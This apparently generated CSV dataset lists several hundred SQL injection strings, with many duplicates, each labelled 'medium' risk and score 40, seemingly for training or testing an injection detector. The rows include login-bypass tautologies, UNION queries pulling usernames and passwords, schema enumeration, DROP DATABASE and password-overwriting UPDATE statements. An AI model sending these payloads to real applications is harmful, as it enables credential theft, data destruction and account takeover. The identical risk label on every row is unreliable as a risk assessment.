query,risk,score
1' OR '1' = '1' GROUP BY 1 -- LIMIT 1,medium,40
'; DROP DATABASE temp -- LIMIT 1,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- /**/ # ",medium,40
' OR username LIKE '%admin%' -- OR 1=1 -- ,medium,40
"' UNION ALL SELECT 1,2 FROM users -- LIMIT 1",medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- OR 1=1 -- ",medium,40
' UNION SELECT * FROM information_schema.tables -- -- 44tc,medium,40
"' UNION SELECT username, password FROM users -- AND 1=1",medium,40
'; DROP DATABASE temp -- /**/ # ,medium,40
"' UNION ALL SELECT 1,2 FROM users -- /**/ # ",medium,40
'; SELECT @@version -- OR 1=1 -- ,medium,40
'; SELECT COUNT(*) FROM users -- # ouj8k,medium,40
' OR username LIKE '%admin%' -- -- 87nn,medium,40
1' OR '1' = '1' GROUP BY 1 -- OR 1=1 -- ,medium,40
' OR username LIKE '%admin%' -- AND 1=1,medium,40
' OR username LIKE '%admin%' -- OR 1=1 -- ,medium,40
'; UPDATE users SET password='pass' OR 1=1 -- ,medium,40
"' UNION SELECT username, password FROM users -- OR 1=1 -- ",medium,40
'; SELECT @@version -- # oabac,medium,40
'; UPDATE users SET password='pass' OR 1=1 -- ,medium,40
' or 1=1 in (select * from users) -- # qmifh,medium,40
"' UNION ALL SELECT 1,2 FROM users -- OR 1=1 -- ",medium,40
' or 1=1 in (select * from users) -- /**/ # ,medium,40
' HAVING 1=1 # AND 1=1,medium,40
' HAVING 1=1 # -- 6r9d,medium,40
' or 1 = 1 LIMIT 1 -- # dvyoq,medium,40
'; UPDATE users SET password='pass' AND 1=1,medium,40
' or 1 = 1 LIMIT 1 -- -- pz9u,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- -- qaxc",medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- -- jdjp",medium,40
' or 1 = 1 LIMIT 1 -- AND 1=1,medium,40
' or 1=1 in (select * from users) -- OR 1=1 -- ,medium,40
' OR username LIKE '%admin%' -- /**/ # ,medium,40
1' OR 1=1; SELECT * FROM users -- # tdisw,medium,40
' HAVING 1=1 # -- llts,medium,40
"' UNION ALL SELECT 1,2 FROM users -- OR 1=1 -- ",medium,40
'; SELECT @@version -- -- t20b,medium,40
'; UPDATE users SET password='pass' /**/ # ,medium,40
' OR username LIKE '%admin%' -- OR 1=1 -- ,medium,40
' OR username LIKE '%admin%' -- OR 1=1 -- ,medium,40
' OR username LIKE '%admin%' -- # uncfw,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- # gjbcy",medium,40
'; UPDATE users SET password='pass' -- uglo,medium,40
1' OR '1' = '1' GROUP BY 1 -- /**/ # ,medium,40
' HAVING 1=1 # -- zesk,medium,40
'; DROP DATABASE temp -- LIMIT 1,medium,40
"' UNION SELECT username, password FROM users -- # p5uy4",medium,40
'; UPDATE users SET password='pass' AND 1=1,medium,40
'; SELECT COUNT(*) FROM users -- -- cbvs,medium,40
' HAVING 1=1 # -- rsyy,medium,40
"' UNION ALL SELECT 1,2 FROM users -- OR 1=1 -- ",medium,40
"' UNION ALL SELECT 1,2 FROM users -- -- ybrw",medium,40
"' UNION SELECT username, password FROM users -- /**/ # ",medium,40
' or 1=1 in (select * from users) -- AND 1=1,medium,40
'; UPDATE users SET password='pass' /**/ # ,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- AND 1=1",medium,40
1' OR '1' = '1' GROUP BY 1 -- -- y4y3,medium,40
1' OR '1' = '1' GROUP BY 1 -- # 3yrhc,medium,40
' UNION SELECT * FROM information_schema.tables -- # 4yv96,medium,40
1' OR '1' = '1' GROUP BY 1 -- OR 1=1 -- ,medium,40
' UNION SELECT * FROM information_schema.tables -- /**/ # ,medium,40
1' OR 1=1; SELECT * FROM users -- AND 1=1,medium,40
'; DROP DATABASE temp -- # dcwzd,medium,40
' HAVING 1=1 # AND 1=1,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- /**/ # ",medium,40
' OR username LIKE '%admin%' -- /**/ # ,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- # 9qf6g",medium,40
1' OR '1' = '1' GROUP BY 1 -- LIMIT 1,medium,40
' UNION SELECT * FROM information_schema.tables -- OR 1=1 -- ,medium,40
' or 1 = 1 LIMIT 1 -- /**/ # ,medium,40
' HAVING 1=1 # # 3ae60,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- # fs219",medium,40
' HAVING 1=1 # /**/ # ,medium,40
' or 1 = 1 LIMIT 1 -- LIMIT 1,medium,40
1' OR 1=1; SELECT * FROM users -- AND 1=1,medium,40
"' UNION SELECT username, password FROM users -- OR 1=1 -- ",medium,40
'; UPDATE users SET password='pass' # eyei5,medium,40
' HAVING 1=1 # LIMIT 1,medium,40
'; SELECT COUNT(*) FROM users -- /**/ # ,medium,40
"' UNION ALL SELECT 1,2 FROM users -- LIMIT 1",medium,40
'; SELECT COUNT(*) FROM users -- /**/ # ,medium,40
'; DROP DATABASE temp -- LIMIT 1,medium,40
1' OR '1' = '1' GROUP BY 1 -- /**/ # ,medium,40
' UNION SELECT * FROM information_schema.tables -- # dpbag,medium,40
' or 1 = 1 LIMIT 1 -- -- uzca,medium,40
1' OR 1=1; SELECT * FROM users -- LIMIT 1,medium,40
'; SELECT @@version -- -- co9g,medium,40
1' OR '1' = '1' GROUP BY 1 -- AND 1=1,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- -- qasp",medium,40
' or 1 = 1 LIMIT 1 -- AND 1=1,medium,40
' HAVING 1=1 # /**/ # ,medium,40
1' OR 1=1; SELECT * FROM users -- OR 1=1 -- ,medium,40
' UNION SELECT * FROM information_schema.tables -- AND 1=1,medium,40
'; SELECT COUNT(*) FROM users -- /**/ # ,medium,40
' or 1 = 1 LIMIT 1 -- LIMIT 1,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- -- 7rg0",medium,40
' OR username LIKE '%admin%' -- /**/ # ,medium,40
' HAVING 1=1 # OR 1=1 -- ,medium,40
'; SELECT COUNT(*) FROM users -- /**/ # ,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- AND 1=1",medium,40
' or 1=1 in (select * from users) -- /**/ # ,medium,40
"' UNION ALL SELECT 1,2 FROM users -- /**/ # ",medium,40
1' OR 1=1; SELECT * FROM users -- LIMIT 1,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- -- 322o",medium,40
'; SELECT COUNT(*) FROM users -- OR 1=1 -- ,medium,40
' or 1 = 1 LIMIT 1 -- /**/ # ,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- AND 1=1",medium,40
1' OR 1=1; SELECT * FROM users -- OR 1=1 -- ,medium,40
' or 1 = 1 LIMIT 1 -- AND 1=1,medium,40
"' UNION ALL SELECT 1,2 FROM users -- # 8qeba",medium,40
'; UPDATE users SET password='pass' /**/ # ,medium,40
'; SELECT COUNT(*) FROM users -- LIMIT 1,medium,40
' OR username LIKE '%admin%' -- AND 1=1,medium,40
'; UPDATE users SET password='pass' OR 1=1 -- ,medium,40
'; DROP DATABASE temp -- -- 2qyi,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- # tkg2j",medium,40
' or 1=1 in (select * from users) -- LIMIT 1,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- AND 1=1",medium,40
' or 1 = 1 LIMIT 1 -- # z9usm,medium,40
' or 1 = 1 LIMIT 1 -- # cwqqz,medium,40
'; SELECT @@version -- # a2ro4,medium,40
'; UPDATE users SET password='pass' /**/ # ,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- # 95wfe",medium,40
"' OR '1'='1' UNION SELECT 1,2 -- OR 1=1 -- ",medium,40
"' UNION SELECT username, password FROM users -- /**/ # ",medium,40
"' UNION SELECT username, password FROM users -- /**/ # ",medium,40
'; SELECT @@version -- OR 1=1 -- ,medium,40
' or 1=1 in (select * from users) -- AND 1=1,medium,40
' OR username LIKE '%admin%' -- -- tkcy,medium,40
'; DROP DATABASE temp -- OR 1=1 -- ,medium,40
'; SELECT COUNT(*) FROM users -- OR 1=1 -- ,medium,40
' HAVING 1=1 # # op09u,medium,40
"' UNION SELECT username, password FROM users -- -- euyu",medium,40
' HAVING 1=1 # /**/ # ,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- -- lnwu",medium,40
1' OR 1=1; SELECT * FROM users -- # et2yx,medium,40
'; UPDATE users SET password='pass' AND 1=1,medium,40
'; UPDATE users SET password='pass' -- snj7,medium,40
'; DROP DATABASE temp -- /**/ # ,medium,40
'; SELECT @@version -- /**/ # ,medium,40
' HAVING 1=1 # /**/ # ,medium,40
' UNION SELECT * FROM information_schema.tables -- -- 2cc1,medium,40
'; UPDATE users SET password='pass' LIMIT 1,medium,40
"' UNION SELECT username, password FROM users -- AND 1=1",medium,40
1' OR 1=1; SELECT * FROM users -- # 45gcn,medium,40
'; SELECT COUNT(*) FROM users -- OR 1=1 -- ,medium,40
' or 1=1 in (select * from users) -- AND 1=1,medium,40
'; DROP DATABASE temp -- -- wzk5,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- OR 1=1 -- ",medium,40
' HAVING 1=1 # -- uabp,medium,40
1' OR 1=1; SELECT * FROM users -- LIMIT 1,medium,40
"' UNION SELECT username, password FROM users -- AND 1=1",medium,40
'; SELECT COUNT(*) FROM users -- LIMIT 1,medium,40
'; DROP DATABASE temp -- OR 1=1 -- ,medium,40
' or 1 = 1 LIMIT 1 -- /**/ # ,medium,40
"' UNION ALL SELECT 1,2 FROM users -- # y9ef8",medium,40
'; SELECT @@version -- # 2m5no,medium,40
"' UNION SELECT username, password FROM users -- /**/ # ",medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- AND 1=1",medium,40
' UNION SELECT * FROM information_schema.tables -- OR 1=1 -- ,medium,40
' UNION SELECT * FROM information_schema.tables -- LIMIT 1,medium,40
' OR username LIKE '%admin%' -- # itu6n,medium,40
' HAVING 1=1 # # vidbt,medium,40
'; SELECT @@version -- /**/ # ,medium,40
' HAVING 1=1 # LIMIT 1,medium,40
' HAVING 1=1 # /**/ # ,medium,40
'; UPDATE users SET password='pass' # t51k8,medium,40
' or 1 = 1 LIMIT 1 -- LIMIT 1,medium,40
1' OR 1=1; SELECT * FROM users -- LIMIT 1,medium,40
'; UPDATE users SET password='pass' /**/ # ,medium,40
' or 1 = 1 LIMIT 1 -- AND 1=1,medium,40
1' OR 1=1; SELECT * FROM users -- /**/ # ,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- LIMIT 1",medium,40
'; SELECT @@version -- OR 1=1 -- ,medium,40
'; SELECT @@version -- /**/ # ,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- # rosmd",medium,40
"' UNION ALL SELECT 1,2 FROM users -- AND 1=1",medium,40
' or 1 = 1 LIMIT 1 -- OR 1=1 -- ,medium,40
1' OR '1' = '1' GROUP BY 1 -- # 1ak8f,medium,40
'; UPDATE users SET password='pass' AND 1=1,medium,40
' or 1=1 in (select * from users) -- -- c8tq,medium,40
'; SELECT @@version -- AND 1=1,medium,40
'; UPDATE users SET password='pass' # 16z2p,medium,40
"' UNION ALL SELECT 1,2 FROM users -- AND 1=1",medium,40
'; SELECT @@version -- # ojo1n,medium,40
"' UNION ALL SELECT 1,2 FROM users -- AND 1=1",medium,40
' or 1=1 in (select * from users) -- AND 1=1,medium,40
'; UPDATE users SET password='pass' OR 1=1 -- ,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- OR 1=1 -- ",medium,40
'; DROP DATABASE temp -- OR 1=1 -- ,medium,40
'; SELECT COUNT(*) FROM users -- /**/ # ,medium,40
"' UNION ALL SELECT 1,2 FROM users -- -- dhof",medium,40
"' UNION SELECT username, password FROM users -- LIMIT 1",medium,40
' OR username LIKE '%admin%' -- AND 1=1,medium,40
' HAVING 1=1 # -- l3hu,medium,40
' UNION SELECT * FROM information_schema.tables -- LIMIT 1,medium,40
' UNION SELECT * FROM information_schema.tables -- # nnv3v,medium,40
1' OR '1' = '1' GROUP BY 1 -- LIMIT 1,medium,40
' or 1=1 in (select * from users) -- /**/ # ,medium,40
'; DROP DATABASE temp -- AND 1=1,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- -- azhd",medium,40
"' UNION ALL SELECT 1,2 FROM users -- LIMIT 1",medium,40
1' OR '1' = '1' GROUP BY 1 -- OR 1=1 -- ,medium,40
' or 1=1 in (select * from users) -- LIMIT 1,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- OR 1=1 -- ",medium,40
' HAVING 1=1 # AND 1=1,medium,40
' OR username LIKE '%admin%' -- /**/ # ,medium,40
1' OR 1=1; SELECT * FROM users -- OR 1=1 -- ,medium,40
1' OR '1' = '1' GROUP BY 1 -- AND 1=1,medium,40
'; UPDATE users SET password='pass' # 7kx4z,medium,40
'; SELECT @@version -- OR 1=1 -- ,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- AND 1=1",medium,40
'; UPDATE users SET password='pass' -- 4yp1,medium,40
' or 1=1 in (select * from users) -- LIMIT 1,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- /**/ # ",medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- LIMIT 1",medium,40
'; SELECT COUNT(*) FROM users -- AND 1=1,medium,40
1' OR 1=1; SELECT * FROM users -- OR 1=1 -- ,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- /**/ # ",medium,40
"' OR '1'='1' UNION SELECT 1,2 -- OR 1=1 -- ",medium,40
"' UNION SELECT username, password FROM users -- OR 1=1 -- ",medium,40
' or 1 = 1 LIMIT 1 -- LIMIT 1,medium,40
"' UNION SELECT username, password FROM users -- OR 1=1 -- ",medium,40
'; UPDATE users SET password='pass' OR 1=1 -- ,medium,40
' HAVING 1=1 # LIMIT 1,medium,40
'; SELECT COUNT(*) FROM users -- LIMIT 1,medium,40
' or 1 = 1 LIMIT 1 -- LIMIT 1,medium,40
' UNION SELECT * FROM information_schema.tables -- AND 1=1,medium,40
' or 1=1 in (select * from users) -- LIMIT 1,medium,40
' HAVING 1=1 # -- wrqb,medium,40
"' UNION SELECT username, password FROM users -- # h0stv",medium,40
'; UPDATE users SET password='pass' -- e3xu,medium,40
"' UNION SELECT username, password FROM users -- LIMIT 1",medium,40
"' UNION SELECT username, password FROM users -- # e6fs2",medium,40
"' UNION ALL SELECT 1,2 FROM users -- AND 1=1",medium,40
"' UNION ALL SELECT 1,2 FROM users -- /**/ # ",medium,40
1' OR '1' = '1' GROUP BY 1 -- /**/ # ,medium,40
' UNION SELECT * FROM information_schema.tables -- AND 1=1,medium,40
' or 1=1 in (select * from users) -- LIMIT 1,medium,40
"' UNION ALL SELECT 1,2 FROM users -- LIMIT 1",medium,40
' UNION SELECT * FROM information_schema.tables -- # 7tf7p,medium,40
"' UNION SELECT username, password FROM users -- AND 1=1",medium,40
'; UPDATE users SET password='pass' LIMIT 1,medium,40
' UNION SELECT * FROM information_schema.tables -- /**/ # ,medium,40
'; SELECT COUNT(*) FROM users -- LIMIT 1,medium,40
' UNION SELECT * FROM information_schema.tables -- AND 1=1,medium,40
'; UPDATE users SET password='pass' OR 1=1 -- ,medium,40
1' OR 1=1; SELECT * FROM users -- OR 1=1 -- ,medium,40
'; SELECT COUNT(*) FROM users -- /**/ # ,medium,40
' or 1=1 in (select * from users) -- OR 1=1 -- ,medium,40
'; SELECT COUNT(*) FROM users -- # 7z6xj,medium,40
'; UPDATE users SET password='pass' # nuj4t,medium,40
' UNION SELECT * FROM information_schema.tables -- -- d93v,medium,40
1' OR '1' = '1' GROUP BY 1 -- LIMIT 1,medium,40
' or 1 = 1 LIMIT 1 -- AND 1=1,medium,40
' or 1=1 in (select * from users) -- /**/ # ,medium,40
1' OR '1' = '1' GROUP BY 1 -- LIMIT 1,medium,40
"' UNION SELECT username, password FROM users -- -- 3shp",medium,40
"' UNION ALL SELECT 1,2 FROM users -- # 5qyzl",medium,40
' or 1 = 1 LIMIT 1 -- # i1j2h,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- /**/ # ",medium,40
"' OR '1'='1' UNION SELECT 1,2 -- LIMIT 1",medium,40
' HAVING 1=1 # LIMIT 1,medium,40
"' UNION ALL SELECT 1,2 FROM users -- /**/ # ",medium,40
' OR username LIKE '%admin%' -- AND 1=1,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- # qd0u7",medium,40
"' UNION SELECT username, password FROM users -- OR 1=1 -- ",medium,40
'; SELECT @@version -- -- 8vst,medium,40
"' UNION SELECT username, password FROM users -- # ks7yn",medium,40
"' UNION ALL SELECT 1,2 FROM users -- AND 1=1",medium,40
1' OR '1' = '1' GROUP BY 1 -- AND 1=1,medium,40
'; SELECT @@version -- -- paxw,medium,40
'; DROP DATABASE temp -- LIMIT 1,medium,40
'; SELECT @@version -- OR 1=1 -- ,medium,40
1' OR '1' = '1' GROUP BY 1 -- # m2hxt,medium,40
' UNION SELECT * FROM information_schema.tables -- -- kkjf,medium,40
'; DROP DATABASE temp -- AND 1=1,medium,40
"' UNION ALL SELECT 1,2 FROM users -- -- uwrm",medium,40
1' OR 1=1; SELECT * FROM users -- LIMIT 1,medium,40
"' UNION ALL SELECT 1,2 FROM users -- # b4m2e",medium,40
'; UPDATE users SET password='pass' LIMIT 1,medium,40
'; DROP DATABASE temp -- /**/ # ,medium,40
"' UNION SELECT username, password FROM users -- # hy2j5",medium,40
"' UNION ALL SELECT 1,2 FROM users -- LIMIT 1",medium,40
'; DROP DATABASE temp -- OR 1=1 -- ,medium,40
' OR username LIKE '%admin%' -- OR 1=1 -- ,medium,40
'; DROP DATABASE temp -- /**/ # ,medium,40
'; UPDATE users SET password='pass' # oj6x1,medium,40
'; SELECT COUNT(*) FROM users -- -- t20r,medium,40
1' OR 1=1; SELECT * FROM users -- AND 1=1,medium,40
'; SELECT COUNT(*) FROM users -- /**/ # ,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- LIMIT 1",medium,40
' UNION SELECT * FROM information_schema.tables -- -- vzfk,medium,40
'; SELECT COUNT(*) FROM users -- OR 1=1 -- ,medium,40
1' OR '1' = '1' GROUP BY 1 -- -- 01xs,medium,40
1' OR '1' = '1' GROUP BY 1 -- OR 1=1 -- ,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- AND 1=1",medium,40
"' OR '1'='1' UNION SELECT 1,2 -- AND 1=1",medium,40
' or 1 = 1 LIMIT 1 -- /**/ # ,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- # v9c0r",medium,40
"' UNION ALL SELECT 1,2 FROM users -- LIMIT 1",medium,40
'; SELECT COUNT(*) FROM users -- # cjkvt,medium,40
"' UNION ALL SELECT 1,2 FROM users -- LIMIT 1",medium,40
'; UPDATE users SET password='pass' /**/ # ,medium,40
' or 1 = 1 LIMIT 1 -- # zsb06,medium,40
'; DROP DATABASE temp -- -- utsa,medium,40
'; SELECT @@version -- LIMIT 1,medium,40
'; DROP DATABASE temp -- LIMIT 1,medium,40
'; SELECT @@version -- OR 1=1 -- ,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- LIMIT 1",medium,40
1' OR '1' = '1' GROUP BY 1 -- -- 5csu,medium,40
' or 1=1 in (select * from users) -- LIMIT 1,medium,40
' OR username LIKE '%admin%' -- /**/ # ,medium,40
' HAVING 1=1 # AND 1=1,medium,40
'; SELECT COUNT(*) FROM users -- OR 1=1 -- ,medium,40
'; SELECT COUNT(*) FROM users -- OR 1=1 -- ,medium,40
"' UNION ALL SELECT 1,2 FROM users -- OR 1=1 -- ",medium,40
' or 1 = 1 LIMIT 1 -- AND 1=1,medium,40
"' UNION SELECT username, password FROM users -- # s8hab",medium,40
'; DROP DATABASE temp -- OR 1=1 -- ,medium,40
"' UNION ALL SELECT 1,2 FROM users -- /**/ # ",medium,40
'; SELECT @@version -- LIMIT 1,medium,40
' UNION SELECT * FROM information_schema.tables -- -- jvp6,medium,40
"' UNION ALL SELECT 1,2 FROM users -- LIMIT 1",medium,40
'; DROP DATABASE temp -- LIMIT 1,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- /**/ # ",medium,40
"' OR '1'='1' UNION SELECT 1,2 -- OR 1=1 -- ",medium,40
'; UPDATE users SET password='pass' AND 1=1,medium,40
'; SELECT COUNT(*) FROM users -- # jp5t3,medium,40
' HAVING 1=1 # -- bvin,medium,40
' or 1 = 1 LIMIT 1 -- # anmcx,medium,40
' HAVING 1=1 # AND 1=1,medium,40
' HAVING 1=1 # AND 1=1,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- # 9z3t1",medium,40
'; DROP DATABASE temp -- OR 1=1 -- ,medium,40
'; SELECT COUNT(*) FROM users -- /**/ # ,medium,40
'; DROP DATABASE temp -- AND 1=1,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- -- 5aro",medium,40
'; DROP DATABASE temp -- OR 1=1 -- ,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- AND 1=1",medium,40
1' OR 1=1; SELECT * FROM users -- OR 1=1 -- ,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- AND 1=1",medium,40
' or 1 = 1 LIMIT 1 -- LIMIT 1,medium,40
'; SELECT COUNT(*) FROM users -- LIMIT 1,medium,40
' or 1 = 1 LIMIT 1 -- -- oxmn,medium,40
"' UNION ALL SELECT 1,2 FROM users -- /**/ # ",medium,40
"' OR '1'='1' UNION SELECT 1,2 -- OR 1=1 -- ",medium,40
' HAVING 1=1 # # mzn3q,medium,40
"' UNION ALL SELECT 1,2 FROM users -- LIMIT 1",medium,40
'; SELECT COUNT(*) FROM users -- /**/ # ,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- LIMIT 1",medium,40
' OR username LIKE '%admin%' -- LIMIT 1,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- AND 1=1",medium,40
"' UNION SELECT username, password FROM users -- AND 1=1",medium,40
' or 1=1 in (select * from users) -- LIMIT 1,medium,40
' or 1 = 1 LIMIT 1 -- # o4caa,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- AND 1=1",medium,40
'; DROP DATABASE temp -- LIMIT 1,medium,40
' or 1 = 1 LIMIT 1 -- LIMIT 1,medium,40
' or 1=1 in (select * from users) -- # rn9q8,medium,40
' or 1 = 1 LIMIT 1 -- OR 1=1 -- ,medium,40
"' UNION SELECT username, password FROM users -- /**/ # ",medium,40
'; SELECT @@version -- -- bb5j,medium,40
' UNION SELECT * FROM information_schema.tables -- LIMIT 1,medium,40
' or 1=1 in (select * from users) -- LIMIT 1,medium,40
' or 1 = 1 LIMIT 1 -- # 9l942,medium,40
'; UPDATE users SET password='pass' /**/ # ,medium,40
' or 1 = 1 LIMIT 1 -- OR 1=1 -- ,medium,40
' OR username LIKE '%admin%' -- # l9fm1,medium,40
'; SELECT COUNT(*) FROM users -- # tmpbc,medium,40
' HAVING 1=1 # AND 1=1,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- /**/ # ",medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- OR 1=1 -- ",medium,40
' OR username LIKE '%admin%' -- # 1pe5k,medium,40
"' UNION ALL SELECT 1,2 FROM users -- OR 1=1 -- ",medium,40
"' UNION SELECT username, password FROM users -- # g9292",medium,40
' or 1=1 in (select * from users) -- AND 1=1,medium,40
"' UNION ALL SELECT 1,2 FROM users -- LIMIT 1",medium,40
"' UNION SELECT username, password FROM users -- -- ixn4",medium,40
"' OR '1'='1' UNION SELECT 1,2 -- /**/ # ",medium,40
"' OR '1'='1' UNION SELECT 1,2 -- AND 1=1",medium,40
' OR username LIKE '%admin%' -- OR 1=1 -- ,medium,40
' HAVING 1=1 # -- r6jx,medium,40
"' UNION SELECT username, password FROM users -- LIMIT 1",medium,40
' OR username LIKE '%admin%' -- /**/ # ,medium,40
'; SELECT @@version -- /**/ # ,medium,40
'; SELECT COUNT(*) FROM users -- LIMIT 1,medium,40
1' OR 1=1; SELECT * FROM users -- /**/ # ,medium,40
1' OR '1' = '1' GROUP BY 1 -- LIMIT 1,medium,40
' or 1=1 in (select * from users) -- /**/ # ,medium,40
1' OR '1' = '1' GROUP BY 1 -- -- gf7z,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- -- c764",medium,40
'; DROP DATABASE temp -- -- qkdr,medium,40
' or 1=1 in (select * from users) -- AND 1=1,medium,40
'; UPDATE users SET password='pass' /**/ # ,medium,40
"' UNION SELECT username, password FROM users -- -- 2et3",medium,40
1' OR '1' = '1' GROUP BY 1 -- LIMIT 1,medium,40
'; DROP DATABASE temp -- -- bi77,medium,40
' HAVING 1=1 # AND 1=1,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- /**/ # ",medium,40
' or 1=1 in (select * from users) -- -- 54sl,medium,40
"' UNION ALL SELECT 1,2 FROM users -- # 564y9",medium,40
1' OR '1' = '1' GROUP BY 1 -- # a4eui,medium,40
1' OR '1' = '1' GROUP BY 1 -- /**/ # ,medium,40
"' UNION SELECT username, password FROM users -- AND 1=1",medium,40
1' OR 1=1; SELECT * FROM users -- AND 1=1,medium,40
' or 1 = 1 LIMIT 1 -- OR 1=1 -- ,medium,40
"' UNION ALL SELECT 1,2 FROM users -- -- foss",medium,40
"' UNION SELECT username, password FROM users -- AND 1=1",medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- LIMIT 1",medium,40
' UNION SELECT * FROM information_schema.tables -- /**/ # ,medium,40
'; SELECT @@version -- # ogypi,medium,40
' UNION SELECT * FROM information_schema.tables -- -- 46ek,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- -- rrxj",medium,40
' UNION SELECT * FROM information_schema.tables -- OR 1=1 -- ,medium,40
' HAVING 1=1 # OR 1=1 -- ,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- /**/ # ",medium,40
'; UPDATE users SET password='pass' -- 9to4,medium,40
"' UNION SELECT username, password FROM users -- OR 1=1 -- ",medium,40
'; DROP DATABASE temp -- -- 0n9s,medium,40
'; DROP DATABASE temp -- LIMIT 1,medium,40
1' OR '1' = '1' GROUP BY 1 -- AND 1=1,medium,40
1' OR '1' = '1' GROUP BY 1 -- # x7m50,medium,40
1' OR '1' = '1' GROUP BY 1 -- OR 1=1 -- ,medium,40
